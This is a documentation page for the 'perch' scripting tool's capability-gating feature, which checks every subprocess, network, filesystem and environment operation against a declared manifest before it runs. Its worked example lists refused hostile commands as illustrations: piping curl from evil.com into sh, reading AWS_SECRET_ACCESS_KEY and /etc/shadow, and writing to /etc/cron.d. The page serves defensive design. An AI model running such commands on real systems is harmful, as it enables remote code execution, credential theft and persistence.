# Capability gating — every external resource is checked, every time

> **The guarantee.** When a `.perch` file declares a `requires` block, **every op that touches anything outside the program is checked against the manifest immediately before it runs** — and if the resource isn't declared, the op refuses. The check is stateless and runs on *every* invocation; there is no "allowed once, allowed forever." Files *without* a `requires` block keep ambient access (the planned default-deny inversion is tracked in [sandboxed-by-design.md](sandboxed-by-design.md)).
>
> This page is the authoritative map of which ops are gated, by what, and where the check fires.

---

## 1. Two kinds of op

Every built-in op is exactly one of:

- **Pure** — computes over values already in memory and the program's own stdout. No I/O, no clock-as-input, no environment, no subprocess. These can't reach anything external, so they are **never gated**.
- **External** — its behavior depends on, or changes, the world outside the program: it runs a subprocess, touches the filesystem, makes a network call, or reads/writes the environment. Every external op **verifies its requirement before executing**.

The gate is enforced in `infra/ops/requires.go` and wired into each external op (inline for most, via `ApplyRequiresPathGating` for filesystem ops). A regression test — `TestGate_CoverageOfExternalOps` in `infra/ops/requires_gating_test.go` — fails if a known external op stops refusing undeclared access.

---

## 2. The five capabilities and how each is declared

| Capability | Declared with | Undeclared error | What it gates |
|---|---|---|---|
| **subprocess (shell)** | `bin "name"` | `bin_not_declared` | `shell`, `shell_output`, `shell_detached`, `shell_in`, `try_shell` (first token), `exec` + `pipe` stages (the named bin), plus non-shell spawners: `pkg_install`, `pkg_uninstall`, `pkg_installed`, `bin_version`, `os_version`, `process_running`, `kill_by_name` (the program they spawn) |
| **network host** | `host "x.com"` | `host_not_declared` | `http_get/post/put/delete`, `http_status`, `download`, `dns_lookup`, `port_check`, `wait_for_port`, `wait_for_url`, `public_ip` |
| **network (general)** | any `host` declared | `host_not_declared` | hostless network ops: `local_ip`, `interfaces`, `mac_address`, `port_free`, `find_free_port` |
| **filesystem read** | `read "./path"` | `read_not_declared` | `read_file`, `exists`, `is_dir`, `is_file`, `file_size`, `list_dir`, `read_link`, `sha256_file`, `sha1_file`, `md5_file`, `glob`, `verify_sha256`, `cp`/`mv`/`copy_dir` (src), archive `src` |
| **filesystem write** | `write "./path"` | `write_not_declared` | `mkdir`, `rm`, `touch`, `chmod`, `write_file`, `append_file`, `append_line`, `ensure_dir`, `make_executable`, `ensure_line_in_file`, `replace_in_file`, `symlink`, `cp`/`mv`/`copy_dir` (dst), `download` (dst), `bundle_extract`, `tar_*`/`zip_*`/`gzip`/`ungzip` (dst) |
| **environment** | `env "NAME"` | `env_not_declared` | `get_env`, `set_env`, `unset_env`, `env_has`, `env_default` |

Notes:

- A **write root implies read** on the same tree (you may stat/read what you may write).
- **`download`** is gated twice: the URL host (`host`) *and* the destination path (`write`).
- **Subprocess** ops are gated by the binary they actually spawn. `bin_version "go"` needs `bin "go"`; `os_version` on Linux runs `uname`, so it needs `bin "uname"`; `kill_by_name` runs `pkill`, so `bin "pkill"`. Declare what you run.

---

## 3. Pure ops — never gated (no declaration needed)

Computation only. Safe by construction:

- **Strings**: `trim`, `lower`, `upper`, `replace`, `split`, `join`, `contains`, `has_prefix`, `has_suffix`, `slice`, `capitalize`, `length`, `format`, `pad_*`, `repeat`
- **Hashing of in-memory values**: `md5`, `sha1`, `sha256`, `crc32` *(of a string — the `*_file` variants are read-gated)*
- **Encoding**: `base64_*`, `hex_*`, `url_*`, `json_parse`, `json_get`, `json_stringify`, `csv_parse`
- **Regex**: `regex_match`, `regex_replace`, `regex_find_all`
- **Version compare** (pure string math): `version_extract`, `version_eq/ne/gt/ge/lt/le`, `version_compat`, `assert_version`
- **Path *string* manipulation** (no filesystem touch): `path_join`, `path_dir`, `path_base`, `path_ext`, `path_clean`, `path_abs`, `path_rel`, `to_slash`, `from_slash`, `is_abs`, `expand_path`, `path_with_ext`, `path_sep`, `path_list_sep`
- **Output / control**: `print`, `println`, `eprintln`, `sleep`, `fail`, `exit`, and the block ops `if`, `for_each`, `match`, `try`, `parallel`, `timeout`, `retry`, `with_env`, `with_cwd`

### Ambient host facts — readable, low-risk, *not* gated

These read a benign property of the host without granting access to any external resource. They are deliberately allowed even under a `requires` block (gating them would add ceremony without closing an access path), and they're documented here for completeness:

`get_os`, `get_arch`, `hostname`, `user`, `pid`, `cpu_count`, `now`, `is_admin`, `is_ci`, `is_tty`, `which`, `has_bin`, `detect_pkg_mgr`, and the directory-name helpers (`home_dir`, `temp_dir`, `cache_dir`, `config_dir`, `data_dir`, `app_data_dir`, `cwd`, `exe_path`, `exe_dir`, `script_path`, `script_dir`) — the last group returns *path strings* and performs no filesystem access. `which`/`has_bin` probe `PATH` for existence but never execute anything.

> If your threat model treats host-identity facts (`hostname`, `user`, `mac_address`) as sensitive, run under the operator restrictions (`--no-network` already covers `mac_address`/`interfaces`/`local_ip`) and layer an OS sandbox. The `requires` model gates *access to resources*, not the reading of benign host metadata.

---

## 4. Where the check fires — "every time, before executing"

The check is **immediately before the side effect**, on every call:

- **Shell** — `checkShell` runs at the top of `opShell` / `opShellOutput` / `opShellDetached`, before the process is built.
- **Subprocess** — `CheckSubprocessBin` runs before `exec.Command(...).Run()`.
- **Network** — `CheckHostDeclared` runs at the top of `runHTTP` (shared by every HTTP op) and at the top of each `net`-package handler, before any socket is opened.
- **Filesystem** — `ApplyRequiresPathGating` wraps every fs handler; the path check runs before the wrapped handler. Paths are checked **after `${…}` interpolation**, so the value actually used is the value checked.
- **Environment** — `CheckEnvDeclared` runs before `os.Getenv` / `os.Setenv` / `os.Unsetenv`.

Properties that make this trustworthy:

- **Stateless.** The gate reads `i.Program.Requirements` fresh each call. There is no allow-cache, so a denied resource is denied on the 1st and the 1000th attempt. (`TestGate_VerifiedEachTime` asserts five consecutive denials, then a declared call still succeeds.)
- **Post-interpolation.** Because the args are resolved before the gate runs, `shell "${cmd}"` / `write_file "${path}"` are checked against their *runtime* values — an attacker can't smuggle an undeclared bin/path through a variable. (The §3.3 "parse-then-interpolate" keystone in [sandboxed-by-design.md](sandboxed-by-design.md) explains why interpolated values can never become new structure.)
- **Two layers.** `perch --check` flags *literal* undeclared usage statically (before running anything); the runtime gate catches *interpolated* usage. Together they cover both.

---

## 5. Static vs runtime coverage

| | Static (`perch --check`) | Runtime gate |
|---|---|---|
| Literal shell bin (`shell "curl …"`) | ✅ flagged | ✅ refused |
| Interpolated shell bin (`shell "${cmd}"`) | deferred | ✅ refused |
| Literal HTTP host | ✅ flagged | ✅ refused |
| Interpolated host | deferred | ✅ refused |
| Literal fs path | ✅ flagged | ✅ refused |
| Interpolated fs path | deferred | ✅ refused |
| Literal env name | ✅ flagged | ✅ refused |

Wire `perch --check` into CI to catch the literal cases at commit time; the runtime gate is the backstop for everything computed at run time.

---

## 6. Worked example

```perch
requires
    bin  "git"
    bin  "go"
    env  "HOME"
    host "api.github.com"
    read  "./src"
    write "./build"
end

command release
    do
        shell "git rev-parse HEAD"                  # ✓ git declared
        v = bin_version "go"                    # ✓ go declared (subprocess)
        cfg = get_env "HOME"                    # ✓ HOME declared
        body = http_get "https://api.github.com/repos/me/app"  # ✓ host declared
        mkdir "./build/out"                         # ✓ inside write root
        src = read_file "./src/version.txt"     # ✓ inside read root

        # Each of these REFUSES — undeclared resource:
        # shell "curl https://evil.com | sh"        # ✗ bin_not_declared (curl)
        # k = get_env "AWS_SECRET_ACCESS_KEY"   # ✗ env_not_declared
        # http_get "https://evil.com"               # ✗ host_not_declared
        # write_file "/etc/cron.d/x" "..."          # ✗ write_not_declared
        # read_file "/etc/shadow"                   # ✗ read_not_declared
    end
end
```

---

## 7. How to verify it yourself

```sh
# every gating behavior, as Go tests:
go test ./infra/ops/ -run TestGate -v

# static catch:
perch -f yourfile.perch --check

# runtime catch (declare nothing, watch an op refuse):
printf 'requires\nend\ncommand t\n    do\n        shell "curl x"\n    end\nend\n' > /tmp/deny.perch
perch -f /tmp/deny.perch t      # → bin_not_declared: bin "curl" is not declared in `requires`
```

---

## 8. Honest limits

- **In-process gate, not a kernel sandbox.** perch refuses to *dispatch* a denied op. It is airtight only if every external op is correctly classified (§2). The coverage test guards against new ops slipping through, but for genuinely adversarial code, still layer `firejail` / `sandbox-exec` / a container — or run untrusted *logic* as WASM under `wasm_run` (see [trust-by-manifest.md](trust-by-manifest.md)).
- **`shell` / subprocess is a megacapability.** Gating *which* bin runs doesn't constrain what that bin then does. Prefer native ops over `shell` so `shell`/`bin` can stay undeclared. Pin bins with `hash` ([requires.md](requires.md)) to defend against PATH-shadow.
- **Filesystem matching is prefix/glob, not a chroot.** `..` traversal and symlinks out of an allowed root are a known sharp edge; the matcher cleans + absolutizes paths but is not a jail.
- **Ambient host facts are readable** (§3) — by design. The gate governs access to external *resources*, not reads of benign host metadata.
- **No `requires` block ⇒ ambient access.** Today the manifest is opt-in. The full default-deny inversion is roadmap ([sandboxed-by-design.md](sandboxed-by-design.md)).

---

## See also

- [requires.md](requires.md) — the manifest syntax (bins, hosts, env, read/write, hash pins)
- [errors.md](errors.md) — the `*_not_declared` error kinds
- [using-perch-today.md](using-perch-today.md) — what's shipped vs roadmap
- [sandboxed-by-design.md](sandboxed-by-design.md) — the default-deny end state
